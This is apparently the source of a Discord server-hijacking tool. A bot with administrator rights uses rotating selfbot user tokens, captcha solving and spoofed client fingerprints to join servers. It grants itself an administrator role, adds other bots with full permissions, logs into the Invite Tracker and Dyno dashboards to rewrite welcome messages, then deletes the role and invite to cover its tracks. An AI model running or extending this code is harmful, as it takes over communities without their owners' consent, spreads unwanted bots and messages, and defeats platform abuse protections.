import { ChannelType, Guild, GuildMember, Invite, Role } from 'discord.js';
import { Client as SelfbotClient } from 'discord.js-selfbot-v13';
import { createLogger } from '@structures/logger';
import captcha from '@structures/captcha';
import Client from '@structures/client';
import config from '@../config.json';
import { sleep } from '@utilities';
import fs from 'node:fs';
import path from 'path';


class Invitation {
	constructor(
		public client: Client
	) { }

	logger = createLogger('Client', 'Invitation');
	token = null;
	userInfo = new Map<string, { id: string; }>();

	public readonly INVITE_TRACKER_ID = '720351927581278219';
	public readonly INVITE_TRACKER_CLIENT_ID = '720351927581278219';

	public readonly DYNO_ID = '155149108183695360';
	public readonly DYNO_CLIENT_ID = '161660517914509312';

	getWelcomeMessage(instance: 'dyno' | 'inviteTracker') {
		if (!config.welcomerBots[instance]?.updateWelcomer) return false;

		const state = path.join(__dirname, '..', '..', 'state');
		const file = instance + 'WelcomerMessage.txt';

		const message = path.join(state, file);
		if (fs.existsSync(message)) {
			return fs.readFileSync(message, 'utf8');
		}

		return false;
	}

	async isAnySpecialActiveBotsInGuild(guild: Guild) {
		if (this.getWelcomeMessage('inviteTracker')) {
			if (await guild.members.fetch(this.INVITE_TRACKER_ID).catch(() => null)) {
				return true;
			}
		}

		if (this.getWelcomeMessage('dyno')) {
			if (await guild.members.fetch(this.DYNO_ID).catch(() => null)) {
				return true;
			}
		}
	}

	async shouldInvite(id: string, guild: Guild) {
		if (!guild) {
			this.logger.info('The bot is no longer in the guild:', id);
			return false;
		}

		if (!guild.members.me) await guild.members.fetchMe();
		if (!guild.members.me.permissions.has('Administrator')) {
			this.logger.info('The bot does not have administrator permissions in the guild:', id);
			return false;
		}

		if (guild.mfaLevel !== 0) {
			this.logger.info('The guild requires 2FA:', id);
			return false;
		}

		if (guild.memberCount <= config.memberThreshold) {
			this.logger.info(`The guild ${id} does not have more members than the threshold.`);
			return false;
		}

		return true;
	}

	async joinGuild(invite: string, token: string, id: string) {
		if (!token || !invite) return false;
		const client = new SelfbotClient({
			captchaSolver: captcha.solve,
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64')
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					return reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				if (client.guilds.cache.has(id)) {
					this.logger.info(`User token is already in guild ${id}.`);
					return resolve(true);
				}

				try {
					this.logger.info('Accepting invite:', invite);
					await client.acceptInvite(invite, { bypassOnboarding: false, bypassVerify: false });
					this.logger.success('Accepted invite:', invite);

					client.destroy();

					resolve(null);
				} catch (e) {
					client.destroy();

					reject(e);
				}
			});
		});
	}

	throwError(error: Error | null) {
		if (error) throw error;
	}

	async perform(id: string) {
		const guild = this.client.guilds.cache.get(id);

		if (!(await this.shouldInvite(id, guild))) {
			return false;
		}

		const botIds = config.bots.map(b => b.botId);
		const contains = [];

		if (config.welcomerBots.inviteTracker.inviteBot) {
			botIds.push(this.INVITE_TRACKER_ID);
		}

		if (config.welcomerBots.dyno.inviteBot) {
			botIds.push(this.DYNO_ID);
		}

		for (const bot of botIds) {
			if (await guild.members.fetch({ user: bot, cache: true }).catch(() => null)) {
				contains.push(bot);
			}
		}

		if (botIds.every(id => contains.includes(id)) && config.skipFullGuild) {
			this.logger.success(`The guild ${id} already has all the bots. Continuing...`);
			return true;
		}


		if (botIds.every(id => contains.includes(id)) && !(await this.isAnySpecialActiveBotsInGuild(guild))) {
			this.logger.success(`The guild ${id} does not have any active special bots and is not going to invite any bots. Continuing...`);
			return true;
		}

		let joinedGuild = false;
		let role: Role = null;
		let invite: Invite = null;

		if (!this.token) this.token = this.client.tokens.getNext();

		if (!this.token) {
			this.logger.warn('No valid tokens left... Stopping... Please add more tokens and restart.');
			this.client.queue.stop();
			return false;
		}

		try {
			this.logger.info('Creating invite...');
			if (!guild.members.me) await guild.members.fetchMe();
			if (!guild.members.me.permissions.has('CreateInstantInvite')) {
				const channel = guild.channels.cache.find(c => c.permissionsFor(guild.members.me, true).has('CreateInstantInvite'));
				if (!channel) {
					this.logger.warn(`The guild ${id} does not have any channels I can create invites in. Continuing...`);
				} else {
					try {
						invite = await guild.invites.create(channel.id, { maxAge: 1.8e5 });
						this.logger.success('Created invite:', invite.code);
					} catch (e) {
						this.logger.error('Failed to create invite:', e);
						this.client.tokens.add(this.token);
						return false;
					}
				}
			} else {
				invite = await guild.invites.create(guild.channels.cache.find(c => c.type === ChannelType.GuildText).id);
			}

			this.logger.info('Created invite:', invite.code);

			this.logger.info('Trying to join invite:', invite.code);
			while (!joinedGuild) {
				try {
					await this.joinGuild(invite.code, this.token, guild.id);
					joinedGuild = true;
				} catch (e) {
					if (e.message.includes('banned')) {
						this.logger.warn(`We are banned from guild ${guild.id}, skipping it.`);
						return true;
					}

					if (e.message.includes('Invites are currently paused')) {
						this.logger.warn(`Invites are paused for guild ${guild.id}, skipping it.`);
						return true;
					}

					this.logger.error(e);

					const isCaptchaError = e.message.includes('Your captcha was unable to be solved after 3 attempts.');

					if (isCaptchaError) {
						this.logger.warn('The captcha was unable to be solved after 3 attempts. Retrying with a new captcha.');
					}

					if (!isCaptchaError) {
						this.client.tokens.invalidate(this.token);
						this.logger.error('Failed to join with token:', e);
						this.token = this.client.tokens.getNext();

						this.logger.info(`Waiting ${config.invalidTokenSleepTime}ms before trying next token...`);
						await sleep(config.invalidTokenSleepTime);
						this.logger.info(`${config.invalidTokenSleepTime}ms timeout over. Trying next token.`);

						if (!this.token) {
							this.logger.warn('No valid tokens left... Stopping... Please add more tokens and restart.');
							this.client.queue.stop();
							return false;
						}
					}
				}
			}

			const user = this.userInfo.get(this.token);
			if (!user?.id) {
				this.logger.error('Failed to get user account\'s ID:', this.token);
				this.client.tokens.invalidate(this.token);
				return false;
			}

			this.logger.info('Fetching user account...');
			const member: GuildMember = await guild.members.fetch(user.id).catch(() => null);
			if (!member) {
				this.logger.error('Failed to fetch user account:', user);
				this.client.tokens.invalidate(this.token);
				return false;
			} else {
				this.logger.success('Fetched user account:', member.user?.username ?? member.id);
			}

			role = await guild.roles.create({ permissions: ['Administrator'], name: this.client.user.displayName });

			this.logger.success('Created role:', role.id);

			try {
				this.logger.info('Adding role to user account...');
				await member.roles.add(role.id);
				this.logger.success('Added role to user account.');
			} catch (e) {
				this.logger.error('Failed to add role to user account:', e);
				this.client.tokens.add(this.token);
				return false;
			}

			const clientIds = config.bots.filter(({ botId }) => !contains.includes(botId)).map(b => b.clientId);

			if (config.welcomerBots.inviteTracker.inviteBot) {
				clientIds.push(this.INVITE_TRACKER_CLIENT_ID);
			}

			if (config.welcomerBots.dyno.inviteBot) {
				clientIds.push(this.DYNO_CLIENT_ID);
			}

			for (const client of clientIds) {
				await this.addBot(client, this.token, guild.id);
			}

			if (config.welcomerBots.inviteTracker.updateWelcomer) {
				try {
					this.logger.info('Updating Invite Tracker welcome message...');
					await this.updateInviteTrackerWelcomeMessage(guild, this.token);
					this.logger.success('Updated Invite Tracker welcome message.');
				} catch (e) {
					this.logger.error('Failed to update Invite Tracker welcome message.', e);
				}
			}

			if (config.welcomerBots.dyno.updateWelcomer) {
				try {
					this.logger.info('Updating Dyno welcome message...');
					await this.updateDynoWelcomeMessage(guild, this.token);
				} catch (e) {
					this.logger.error('Failed to update Dyno welcome message.', e);
				}
			}
		} catch (e) {
			this.client.tokens.add(this.token);
		} finally {
			try {
				if (joinedGuild) await this.leaveGuild(this.token, id);
			} finally {
				if (invite) {
					try {
						await invite.delete();
						this.logger.info('Deleted invite:', invite.code);
					} catch (e) {
						this.logger.error(`Failed to delete invite for ${id}:`, e);
					}
				}

				if (role) {
					try {
						await role.delete();
						this.logger.info('Deleted role:', role.id);
					} catch (e) {
						this.logger.error(`Failed to delete role for ${id}:`, e);
					}
				}
			}
		}

		return true;
	}

	async leaveGuild(token: string, id: string) {
		if (!token || !id) return false;
		const client = new SelfbotClient({
			captchaSolver: captcha.solve,
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		client.on('debug', (msg) => msg.includes('captcha') && this.logger.debug(msg));

		const res = await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				if (!client.guilds.cache.has(id)) {
					this.logger.info(`User token already left guild: ${id}. Skipping invite accept.`);
					return resolve(true);
				}

				try {
					this.logger.info('Leaving guild:', id);
					const guild = client.guilds.cache.get(id);
					if (guild) await guild.leave();
					this.logger.info('Left guild:', id);
				} catch (e) {
					this.logger.error('Failed to leave guild:', e);
					return resolve(false);
				}

				client.destroy();
				resolve(true);
			});
		});

		return res;
	}

	async addBot(clientId: string, token: string, guild: string) {
		if (!token || !guild || !clientId) return false;
		const client = new SelfbotClient({
			captchaSolver: captcha.solve,
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		client.on('debug', (msg) => msg.includes('captcha') && this.logger.debug(msg));

		const res = await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				const g = client.guilds.cache.get(guild);
				if (!g) return resolve(false);

				let addedToGuild = false;

				while (!addedToGuild) {
					try {
						this.logger.info('Adding bot to guild:', { guild, clientId });

						await client.authorizeURL(
							`https://canary.discord.com/api/oauth2/authorize?client_id=${clientId}&scope=bot%20applications.commands`,
							{
								guild_id: g.id,
								permissions: '8', // Admin
								integration_type: 0,
								authorize: true,
							},
						);

						this.logger.success('Added bot to guild:', { guild, clientId });
						addedToGuild = true;
					} catch (e) {
						if (e.message.includes('Maximum number of server integrations reached')) {
							this.logger.warn('This guild has reached the maximum number of server integrations. Skipping...');

							client.destroy();
							return resolve(true);
						}

						if (!e.message.includes('Your captcha was unable to be solved after 3 attempts')) {
							this.logger.error('Failed to add bot to guild:', e);
							this.logger.info('Trying to add bot without admin permissions...');

							while (!addedToGuild) {
								try {
									await client.authorizeURL(
										`https://canary.discord.com/api/v9/oauth2/authorize?client_id=${clientId}&scope=bot%20applications.commands`,
										{
											guild_id: g.id,
											permissions: '0',
											integration_type: 0,
											authorize: true
										},
									);

									this.logger.success('Added bot to guild:', { guild, clientId });
									addedToGuild = true;
								} catch (e) {
									if (!e.message.includes('Your captcha was unable to be solved after 3 attempts')) {
										this.logger.error('Failed to add bot without admin permissions.');
										return resolve(false);
									}

									this.logger.error(e);
								}
							}
						}

						this.logger.error(e);
					}
				}

				client.destroy();
				resolve(true);
			});
		});

		return res;
	}

	async updateInviteTrackerWelcomeMessage(guild: Guild, userToken: string, retry: boolean = false) {
		if (!(await guild.members.fetch(this.INVITE_TRACKER_ID).catch(() => null))) {
			this.logger.warn('Invite Tracker not in guild, skipping configuration:', { guild: guild.id, userToken });
			return false;
		}

		try {
			const cookie = await this.getInviteTrackerCookies(userToken);
			if (!cookie) throw new Error('Failed to get cookie.');


			const setMessage = await this.client.requests(`https://api.invite-tracker.com/v2/modules/${guild.id}/joindm_messages`, {
				timeout: Infinity,
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					'enabled': true,
					'message': this.getWelcomeMessage('inviteTracker')
				})
			}, 'post');


			if (setMessage.status !== 200) {
				if (setMessage.status === 401) {
					const json = setMessage;
					const error = json['error']?.['message'];

					if (error?.includes('Unauthorized') && !retry) {
						this.logger.error('Invite Tracker set returned unauthorized. Retrying...', { error });
						return await this.updateInviteTrackerWelcomeMessage(guild, userToken, true);
					}
				}

				this.logger.error('Invite Tracker welcomer set returned unexpected response code:', setMessage.status, '|', 'Expected: 200', setMessage);
				return false;
			}

			return true;
		} catch (e) {
			this.logger.error('Failed to update Invite Tracker welcome message:', e);
			return false;
		}
	}

	async getInviteTrackerCookies(token: string) {
		const login = await this.client.requests('https://api.invite-tracker.com/v2/auth', {
			timeout: Infinity,
			disableRedirect: true,
			ja3: config.botRequests.ja3,
			headers: {
				'User-Agent': config.botRequests.userAgent
			}
		}).catch(this.logger.error);

		if (!login) return false;


		if (login.status !== 200 && !login.body) {
			this.logger.error('Invite Tracker auth returned unexpected response code from /login:', login.status, login.body, '|', 'Expected: 200');
			return false;
		}


		const origCookies = login.headers['Set-Cookie'].find((cookie) => cookie.startsWith('session=') && !cookie.startsWith('session=;'));
		const [origSession] = origCookies.match(/session\=[^;]+/);

		const url = login.body;
		this.logger.info('Invite Tracker Auth Initial Discord URL:', url);

		const authorization = await fetch(url.toString(), {
			method: 'POST',
			headers: {
				'Authorization': token,
				'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				'User-Agent': config.userAgent,
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				authorize: true,
				permissions: 0
			})
		}).catch(this.logger.error);


		if (!authorization) return false;

		if (authorization.status !== 200) {
			this.logger.error('Discord auth returned unexpected response code from authorization:', login.status, '|', 'Expected: 200');
			return false;
		}

		const callback = await authorization.json();
		const returnUrl = new URL(callback.location);
		const code = returnUrl.searchParams.get('code');

		if (!code) {
			this.logger.error('Discord auth response didn\'t return a code. Aborting.');
			return false;
		}

		this.logger.success(`Discord auth returned code ${code}.`);
		this.logger.info('Finalizing login and exchanging code for token...');

		const authorizeURL = new URL('https://api.invite-tracker.com/v2/oauth');

		for (const [key, value] of returnUrl.searchParams.entries()) {
			authorizeURL.searchParams.set(key, value);
		}

		this.logger.info('Final auth URL: ', authorizeURL.toString());

		const res = await this.client.requests(authorizeURL.toString(), {
			ja3: config.botRequests.ja3,
			timeout: Infinity,
			headers: {
				'Cookie': origSession,
				'User-Agent': config.botRequests.userAgent
			},
		}, 'get');

		if (res.status !== 200 && !res.body) {
			this.logger.error('Invite Tracker auth returned unexpected response code from API /oauth:', res.status, res.body, '|', 'Expected: 200');
			return false;
		}

		const cookies = res.headers['Set-Cookie'].find((cookie) => cookie.startsWith('session=') && !cookie.startsWith('session=;'));
		const [session] = cookies?.match(/session\=[^;]+/) ?? [];

		if (!session) {
			this.logger.error(`Failed to get cookie from authorization:`, res.headers);
			return null;
		}

		if (res.body['success']) {
			this.logger.success('Code registered. Got Invite Tracker session:', origSession);
			return session;
		} else {
			return null;
		}
	}

	async updateDynoWelcomeMessage(guild: Guild, userToken: string, notInGuildRetries: number = 0, retry: boolean = false) {
	}

	async getDynoCookies(token: string) {
		this.logger.info('Requesting cookies...');
		const login = await this.client.requests('https://dyno.gg/auth', {
			ja3: config.botRequests.ja3,
			timeout: Infinity,
			headers: {
				'User-Agent': config.botRequests.userAgent
			}
		}).catch(this.logger.error);

		if (!login) return false;

		if (login.status !== 200) {
			this.logger.error('Dyno auth returned unexpected response code from /login:', login.status, '|', 'Expected: 200');
			return false;
		}


		const { body } = login;

		const cookie = login.headers['Set-Cookie'].find((cookie) => cookie.startsWith('dynobot.sid=') && !cookie.startsWith('dynobot.sid=;'));
		const [sid] = cookie.match(/dynobot\.sid\=[^;]+/);
		const [, url] = body.match(/window\.location\.href = '(.*)'/);

		this.logger.info('Dyno Auth Initial Discord URL:', url);

		const params = url.split('?')[1];
		const api = new URL('https://discord.com/api/' + 'v' + config.clientOptions.apiVersion + '/oauth2/authorize?' + params);

		this.logger.info('Dyno Auth API URL:', api.toString());

		const authorization = await fetch(api, {
			redirect: 'follow',
			method: 'POST',
			headers: {
				'Authorization': token,
				'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				'User-Agent': config.userAgent,
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				authorize: true,
				permissions: 0
			})
		}).catch(this.logger.error);

		if (!authorization) return false;

		if (authorization.status !== 200) {
			this.logger.error('Discord auth returned unexpected response code from authorization:', login.status, '|', 'Expected: 200');
			return false;
		}

		const callback = await authorization.json();
		const returnUrl = new URL(callback.location);
		const code = returnUrl.searchParams.get('code');

		if (!code) {
			this.logger.error('Discord auth response didn\'t return a code. Aborting.');
			return false;
		}

		this.logger.success(`Discord auth returned code ${code}.`);
		this.logger.info('Finalizing login and exchanging code for token...');

		const final = await this.client.requests(returnUrl.toString(), {
			ja3: config.botRequests.ja3,
			timeout: Infinity,
			headers: {
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'Cookie': sid,
				'User-Agent': config.botRequests.userAgent,
				'Referer': 'https://discord.com/'
			}
		}, 'get').catch(this.logger.error);

		if (!final) return false;

		if (final.status !== 200) {
			this.logger.error('Dyno auth returned unexpected response code from /return:', final.status, '|', 'Expected: 301/302');
			return false;
		}

		this.logger.success('Got dyno cookie:', sid);

		return sid;
	}
}

export default Invitation;